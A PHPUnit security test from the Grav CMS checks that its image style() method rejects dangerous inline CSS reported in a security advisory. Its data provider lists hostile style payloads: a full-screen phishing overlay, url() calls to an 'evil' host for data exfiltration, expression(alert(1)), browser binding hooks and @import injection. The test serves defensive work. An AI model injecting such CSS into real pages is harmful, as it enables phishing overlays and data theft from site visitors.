<?php

use Grav\Common\Media\Traits\MediaObjectTrait;

/**
 * Class MediaStyleSecurityTest
 *
 * Covers: GHSA-pmf8-g7c8-7v54 (Markdown image `?style=…` reaches
 * `MediaObjectTrait::style()`, which wrote editor-controlled CSS verbatim into
 * the rendered `<img style="…">`). Follow-up to GHSA-r7fx-8g49-7hhr, whose fix
 * gated the `attribute()` sibling but left this inline-style sink open.
 *
 * The fix parses each declaration and rejects the whole value if any property
 * is a positioning/stacking primitive (overlay phishing) or any value calls a
 * function (`url()`/`expression()`), opens an at-rule, or carries markup. Plain
 * layout CSS (float, width, margin, …) still passes.
 *
 * Naming convention: test{Method}_{GHSA_ID}_{description}
 */
class MediaStyleSecurityTest extends \PHPUnit\Framework\TestCase
{
    private function newMedium(): object
    {
        // Lightweight stand-in: any class using MediaObjectTrait works. style()
        // appends to the trait's protected $styleAttributes; we read it back
        // through reflection. Stub the abstract methods we don't exercise.
        return new class {
            use MediaObjectTrait;
            public function addMetaFile($filepath) {}
            public function __toString(): string { return ''; }
            public function url($reset = true) { return ''; }
            public function get($name, mixed $default = null, $separator = null) { return $default; }
            public function set($name, mixed $value, $separator = null) { return $this; }
            protected function createThumbnail($thumb) { return null; }
            protected function createLink(array $attributes) { return null; }
            protected function getItems(): array { return []; }
        };
    }

    private function styles(object $medium): array
    {
        $r = new ReflectionClass($medium);
        $p = $r->getProperty('styleAttributes');
        $p->setAccessible(true);
        return (array) $p->getValue($medium);
    }

    /**
     * @dataProvider providerGHSApmf8_DangerousStyles
     */
    public function testStyle_GHSApmf8_RejectsDangerousStyles(string $style, string $description): void
    {
        $m = $this->newMedium();
        $m->style($style);

        self::assertSame([], $this->styles($m), "Should not store dangerous style: $description");
    }

    public static function providerGHSApmf8_DangerousStyles(): array
    {
        return [
            // The advisory PoC: full-viewport fixed overlay.
            ['position:fixed;top:0;left:0;width:100vw;height:100vh;background:white;z-index:9999', 'phishing overlay'],
            ['position:absolute;top:0;left:0', 'absolute positioning overlay'],
            ['z-index:9999', 'stacking primitive'],
            ['background:url(//evil/log?c=a)', 'CSS data-exfil via url()'],
            ['background-image:url(//evil)', 'background-image url()'],
            ['width:expression(alert(1))', 'legacy IE expression()'],
            ['behavior:url(#default#x)', 'IE behavior binding'],
            ['-moz-binding:url(//evil)', 'legacy Firefox binding'],
            ['x:y;@import "evil"', 'at-rule injection'],
            ['color:"red', 'quote character'],
            ['float', 'declaration with no value'],
            ['<script', 'markup characters'],
        ];
    }

    /**
     * @dataProvider providerGHSApmf8_SafeStyles
     */
    public function testStyle_GHSApmf8_AcceptsSafeStyles(string $style, string $description): void
    {
        $m = $this->newMedium();
        $m->style($style);

        self::assertSame([rtrim($style, ';') . ';'], $this->styles($m), "Should accept safe style: $description");
    }

    public static function providerGHSApmf8_SafeStyles(): array
    {
        return [
            ['float:left', 'documented float example'],
            ['float:right;margin:0 0 1em 1em', 'float with margin'],
            ['width:50%', 'percentage width'],
            ['max-width:300px', 'hyphenated property'],
            ['height:auto', 'auto height'],
            ['border:1px solid #ccc', 'border with hex color'],
            ['display:block', 'display block'],
            ['margin:0 auto', 'centering margin'],
            ['-webkit-box-shadow:none', 'vendor-prefixed property'],
        ];
    }
}
